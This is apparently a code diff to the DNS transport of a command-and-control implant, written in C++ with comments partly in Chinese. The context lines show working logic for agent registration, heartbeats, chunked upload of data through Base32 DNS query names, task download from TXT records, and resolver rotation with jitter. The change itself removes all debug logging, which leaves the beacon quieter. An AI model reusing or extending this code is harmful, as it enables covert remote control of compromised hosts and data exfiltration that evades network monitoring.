@@ -146,11 +146,9 @@ static BOOL DnsQuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR
 	// This speeds up failover detection significantly
 	
 	// Log readable QNAME (domain format)
-	DnsDebugLogf("[TX] QNAME: %s -> %s", qname, resolver);
 	
 	int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
 	if (sent != offset) {
-		DnsDebugLogf("[DNS] sendto failed: sent=%d expected=%d", sent, offset);
 		ApiWin->closesocket(s);
 		ApiWin->WSACleanup();
 		return FALSE;
@@ -165,13 +163,11 @@ static BOOL DnsQuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR
 
 	int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
 	if (selResult == 0) {
-		DnsDebugLogf("[DNS] timeout resolver=%s", resolver);
 		ApiWin->closesocket(s);
 		ApiWin->WSACleanup();
 		return FALSE;
 	}
 	if (selResult == SOCKET_ERROR) {
-		DnsDebugLog("[DNS] select error");
 		ApiWin->closesocket(s);
 		ApiWin->WSACleanup();
 		return FALSE;
@@ -180,19 +176,16 @@ static BOOL DnsQuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR
 	int addrLen = sizeof(addr);
 	recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
 	if (recvLen > 0) {
-		DnsDebugLogf("[RX] len=%d", recvLen);
 	}
 
 	ApiWin->closesocket(s);
 	ApiWin->WSACleanup();
 	if (recvLen <= 0) {
-		DnsDebugLog("[DNS] no response after retries");
 		return FALSE;
 	}
 
 	// 解析 answers，根据 qtypeCode 决定如何重组 payload
 	if (recvLen < 12) {
-		DnsDebugLogf("[DNS] DnsQueryTxt: response too short (recvLen=%d)", recvLen);
 		return FALSE;
 	}
 	int qdcount = (resp[4] << 8) | resp[5];
@@ -291,7 +284,6 @@ static BOOL DnsQuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR
 
 ConnectorDNS::ConnectorDNS()
 {
-	DnsDebugLog("[DNS] ConnectorDNS::ctor");
 }
 
 BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
@@ -329,9 +321,7 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
         this->resolverCount = 1;
     }
 
-    DnsDebugLogf("[DNS] SetConfig: resolverCount=%lu", this->resolverCount);
     for (ULONG i = 0; i < this->resolverCount; ++i) {
-        DnsDebugLogf("[DNS]   resolver[%lu]=%s", i, this->resolverList[i]);
     }
 
     // copy encrypt key (fixed 16 bytes binary, NOT null-terminated string)
@@ -404,8 +394,6 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
     }
 
     this->initialized = TRUE;
-    DnsDebugLogf("[DNS] SetConfig OK: sid=%s domain=%s pktSize=%lu labelSize=%lu", 
-                 this->sid, this->domain, this->pktSize, this->labelSize);
     return TRUE;
 }
 
@@ -463,7 +451,6 @@ void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
 		this->resolverCount = 1;
 	}
 
-	DnsDebugLogf("[DNS] UpdateResolvers: resolverCount=%lu", this->resolverCount);
 }
 
 BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
@@ -471,7 +458,6 @@ BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BY
 	*outSize = 0;
 
 	if (this->resolverCount == 0) {
-		DnsDebugLog("[DNS] QueryWithRotation: no resolvers configured");
 		return FALSE;
 	}
 
@@ -484,24 +470,20 @@ BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BY
 		// Skip disabled resolvers (failure backoff)
 		ULONG nowTick = GetTickCount();
 		if (this->resolverDisabledUntil[idx] && nowTick < this->resolverDisabledUntil[idx]) {
-			DnsDebugLogf("[DNS] Resolver[%lu] %s: disabled until %lu (now=%lu)", idx, resolver, this->resolverDisabledUntil[idx], nowTick);
 			continue;
 		}
 
-		DnsDebugLogf("[DNS] QueryWithRotation: trying resolver[%lu]=%s", idx, resolver);
 
 		if (DnsQuerySingle(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
 			// Success - update current index and reset fail count
 			this->currentResolverIndex = idx;
 			this->resolverFailCount[idx] = 0;
 			this->resolverDisabledUntil[idx] = 0;
-			DnsDebugLogf("[DNS] QueryWithRotation: SUCCESS via resolver[%lu]=%s", idx, resolver);
 			return TRUE;
 		}
 
 		// Failure - increment fail count
 		this->resolverFailCount[idx]++;
-		DnsDebugLogf("[DNS] QueryWithRotation: FAILED resolver[%lu]=%s failCount=%lu", idx, resolver, this->resolverFailCount[idx]);
 
 		// After 2 consecutive failures, disable this resolver temporarily
 		// Lower threshold since we removed internal retries from DnsQuerySingle
@@ -511,12 +493,10 @@ BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BY
 			ULONG jitter = GetTickCount() & 0x0FFF; // 0-4095ms jitter
 			this->resolverDisabledUntil[idx] = GetTickCount() + backoff + jitter;
 			this->resolverFailCount[idx] = 0;
-			DnsDebugLogf("[DNS] Resolver[%lu] %s: disabled for %lu ms", idx, resolver, backoff + jitter);
 		}
 	}
 
 	// All resolvers failed
-	DnsDebugLog("[DNS] QueryWithRotation: ALL resolvers failed");
 	return FALSE;
 }
 
@@ -534,7 +514,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 
     // HI：第一次带 beat 的调用仍然沿用原始打包方式
     if (!this->hiSent && data && data_size) {
-        DnsDebugLogf("[DNS] [UP] HI beat size=%lu", data_size);
         // Base32 encoding expands data by ~1.6x. The total DNS QNAME length is limited to 253 bytes.
         // Subtracting domain and prefix overhead, we have about 150-180 chars for data labels.
         // 180 chars Base32 -> ~110 bytes raw data.
@@ -565,12 +544,10 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         this->lastQueryOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
         if (this->lastQueryOk) {
             this->hiSent = TRUE;
-            DnsDebugLog("[DNS] HI: SUCCESS - agent registered");
         } else {
             if (this->hiRetries > 0) {
                 this->hiRetries--;
             }
-            DnsDebugLogf("[DNS] HI: FAILED, retries left=%lu", this->hiRetries);
         }
         return;
     }
@@ -578,7 +555,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // 之后所有有数据的调用视为 PUT，使用应用层分片：
     // frame = [META_V1:8][4 bytes total_len][4 bytes offset][chunk...]
     if (data && data_size) {
-        DnsDebugLogf("[DNS] [UP] PUT total=%lu bytes", data_size);
         const ULONG metaSize = sizeof(DNS_META_V1);
         const ULONG headerSize = metaSize + 8; // meta + [total][offset]
         ULONG total = data_size;
@@ -650,14 +626,12 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             BOOL putOk = FALSE;
             for (int retry = 0; retry < 3 && !putOk; retry++) {
                 if (retry > 0) {
-                    DnsDebugLogf("[DNS] [UP] PUT retry=%d off=%lu", retry, offset);
                     ApiWin->Sleep(100 + (GetTickCount() % 50));  // Backoff before retry
                 }
                 putOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
             }
             
             if (!putOk) {
-                DnsDebugLogf("[DNS] [UP] PUT failed off=%lu retries=3 abort", offset);
                 return;  // Abort upload, will retry entire upload next time
             }
 
@@ -671,7 +645,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         }
         // 记录本次上行总量，供自适应 sleep 使用
         this->lastUpTotal = total;
-        DnsDebugLogf("[DNS] [UP] PUT done total=%lu", total);
         
         // After PUT, send ACK heartbeat with nonce to confirm task was received
         // After PUT, send ACK heartbeat with taskNonce to confirm which task was completed
@@ -705,8 +678,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             BYTE tmp[16];
             ULONG tmpSize = 0;
             this->QueryWithRotation(ackQname, "A", tmp, sizeof(tmp), &tmpSize);
-            DnsDebugLogf("[DNS] [UP] ACK sid=%s ack=%lu nonce=%08x taskNonce=%08lx", 
-                         this->sid, this->downAckOffset, ackNonce, this->downTaskNonce);
             // NOTE: Do NOT reset downAckOffset here! Keep it so subsequent HB requests
             // continue to carry the ACK until server confirms (no_tasks) or new task starts.
         }
@@ -784,8 +755,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         ULONG hbWireSeq = DnsBuildWireSeq(hbLogicalSeq, kDnsSignalBitsDNS);
         DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
         
-        DnsDebugLogf("[DNS] [HB-REQ] sid=%s seq=%lu ack=%lu nonce=%08x taskNonce=%08lx", 
-                     this->sid, this->seq + 1, this->downAckOffset, hbNonce, this->downTaskNonce);
         
         BYTE ipBuf[16];
         ULONG ipSize = 0;
@@ -796,7 +765,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                 // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
                 this->seq++;
-                DnsDebugLog("[DNS] [HB-RSP] no_tasks ip=0.0.0.0");
                 // 重置 ACK offset 因为没有待下载的任务
                 this->downAckOffset = 0;
                 this->hasPendingTasks = FALSE;
@@ -807,13 +775,10 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             // 这样 MainAgent 才能在下一轮循环检查 IsBusy() 并进入 burst 模式
             this->hasPendingTasks = TRUE;
             this->seq++; // 更新 seq，因为心跳已完成
-            DnsDebugLogf("[DNS] [HB-RSP] has_tasks ip=%u.%u.%u.%u - return to trigger burst", 
-                         ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
             return; // 返回让 MainAgent 检查 IsBusy() 并进入 burst
         } else {
             // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
             this->lastQueryOk = FALSE;
-            DnsDebugLog("[DNS] [HB-RSP] A_query_failed");
             return;
         }
     }
@@ -844,15 +809,12 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     ULONG logicalSeq = ++this->seq;
     ULONG getWireSeq = DnsBuildWireSeq(logicalSeq, kDnsSignalBitsDNS);
     DnsBuildQName(this->sid, "api", getWireSeq, this->idx, reqLabel, this->domain, qname, sizeof(qname));
-    DnsDebugLogf("[DNS] [DOWN-REQ] sid=%s seq=%lu off=%lu nonce=%08x", this->sid, logicalSeq, reqOffset, nonce);
     BYTE respBuf[1024];
     ULONG respSize = 0;
     if (this->QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
         this->lastQueryOk = TRUE;
-        DnsDebugLogf("[DNS] [DOWN-RSP] sid=%s raw_len=%lu", this->sid, respSize);
         // Check for simple ACK "OK"
         if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
-            DnsDebugLog("[DNS] GET: received OK ACK");
             return;
         }
 
@@ -860,11 +822,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         BYTE binBuf[1024];
         int binLen = DnsBase64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
         if (binLen <= 0) {
-            DnsDebugLog("[DNS] [DOWN-RSP] b64_decode_failed_or_empty");
             // Server may have restarted and lost task state
             // Abort current download so next heartbeat can re-check for tasks
             if (this->downBuf) {
-                DnsDebugLog("[DNS] GET: Aborting incomplete download due to empty response");
                 MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                 this->downBuf = NULL;
                 this->downTotal = 0;
@@ -891,7 +851,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             offset |= ((ULONG)binBuf[6] << 8);
             offset |= ((ULONG)binBuf[7] << 0);
             ULONG chunkLen = binLen - headerSize;
-            DnsDebugLogf("[DNS] [DOWN-CHUNK] sid=%s total=%lu off=%lu len=%lu want=%lu", this->sid, total, offset, chunkLen, reqOffset);
             const ULONG maxDownloadSize = 4 << 20; // 4MB
             if (total > 0 && total <= maxDownloadSize && offset < total) {
                 // NEW DESIGN: Verify received offset matches what we requested.
@@ -908,8 +867,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                         
                         if (newTaskNonce != 0 && newTaskNonce != this->downTaskNonce) {
                             // Different taskNonce: Server restarted with new task, reset our state
-                            DnsDebugLogf("[DNS] [DOWN-CHUNK] SERVER_RESTART: new_nonce=%08lx old_nonce=%08lx - resetting", 
-                                         newTaskNonce, this->downTaskNonce);
                             if (this->downBuf) {
                                 MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                             }
@@ -921,11 +878,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                             // Don't return - let it fall through to process this as new task
                         } else {
                             // Same taskNonce or unknown: probably cached old response, discard
-                            DnsDebugLogf("[DNS] [DOWN-CHUNK] offset_mismatch got=%lu want=%lu discard", offset, reqOffset);
                             return;
                         }
                     } else {
-                        DnsDebugLogf("[DNS] [DOWN-CHUNK] offset_mismatch got=%lu want=%lu discard", offset, reqOffset);
                         return; // Discard, will retry with same reqOffset next time
                     }
                 }
@@ -945,8 +900,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 BOOL isNewTask = (!this->downBuf || this->downTotal != total);
                 // Also check taskNonce: if nonce differs, it's a new task even if total is same
                 if (!isNewTask && offset == 0 && chunkTaskNonce != 0 && chunkTaskNonce != this->downTaskNonce) {
-                    DnsDebugLogf("[DNS] [DOWN-CHUNK] taskNonce_changed old=%08lx new=%08lx restart", 
-                                 this->downTaskNonce, chunkTaskNonce);
                     isNewTask = TRUE;
                 }
                 
@@ -955,8 +908,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 // this is likely a DNS cache replaying the old task response. Ignore it.
                 if (isNewTask && offset == 0 && chunkTaskNonce != 0 && 
                     chunkTaskNonce == this->downTaskNonce && this->downAckOffset > 0) {
-                    DnsDebugLogf("[DNS] [DOWN-CHUNK] REJECT: cached replay of completed task nonce=%08lx ack=%lu",
-                                 chunkTaskNonce, this->downAckOffset);
                     return; // Ignore this cached response
                 }
                 
@@ -964,8 +915,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     // CRITICAL: If total or taskNonce changed, this is a NEW task
                     // We must discard current chunk and restart from offset=0
                     if (this->downBuf && this->downTotal) {
-                        DnsDebugLogf("[DNS] [DOWN-CHUNK] task_changed old_total=%lu new_total=%lu restart", 
-                                     this->downTotal, total);
                         MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                     }
                     this->downBuf = (BYTE*)MemAllocLocal(total);
@@ -978,11 +927,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downFilled = 0;
                     this->downAckOffset = 0; // Reset ACK offset for NEW task
                     this->downTaskNonce = chunkTaskNonce; // Record new task nonce
-                    DnsDebugLogf("[DNS] [DOWN-ASM] new_task total=%lu nonce=%08lx", total, chunkTaskNonce);
                     
                     // If current chunk offset != 0, discard it and request from 0 next time
                     if (offset != 0) {
-                        DnsDebugLogf("[DNS] [DOWN-CHUNK] nonzero_offset_on_new off=%lu discard_retry", offset);
                         return; // Next SendData() will request offset=0
                     }
                 }
@@ -997,10 +944,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 // Update progress: since we request sequentially, downFilled = offset + n
                 this->downFilled = offset + n;
                 this->downAckOffset = this->downFilled;
-                DnsDebugLogf("[DNS] [DOWN-ASM] sid=%s filled=%lu total=%lu", 
-                             this->sid, this->downFilled, this->downTotal);
                 if (this->downFilled >= this->downTotal) {
-                    DnsDebugLogf("[DNS] [DOWN-ASM] sid=%s complete total=%lu", this->sid, this->downTotal);
                     // 解析会话头：[flags:1][taskNonce:4][origLen:4]，然后将原始 payload 交给上层。
                     // 帧头大小 = 1 + 4 + 4 = 9 字节
                     const ULONG frameHeaderSize = 9;
@@ -1050,7 +994,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downTotal  = 0;
                     this->downFilled = 0;
                     this->hasPendingTasks = FALSE;
-                    DnsDebugLogf("[DNS] [DOWN-DONE] sid=%s size=%lu ack=%lu", this->sid, finalSize, this->downAckOffset);
                 }
                 return;
             }
@@ -1082,11 +1025,5 @@ void ConnectorDNS::RecvClear()
 
 BOOL ConnectorDNS::IsBusy() const
 {
-    BOOL busy = (this->downBuf != NULL) || this->hasPendingTasks;
-    // 只有当状态发生变化或确实繁忙时才打印，避免刷屏
-    // 但为了调试那个该死的 10s 延迟，我们暂时允许它打印
-    if (busy) {
-        DnsDebugLogf("[DNS] IsBusy=TRUE (downBuf=%p pending=%d)", this->downBuf, this->hasPendingTasks);
-    }
-    return busy;
+    return (this->downBuf != NULL) || this->hasPendingTasks;
 }
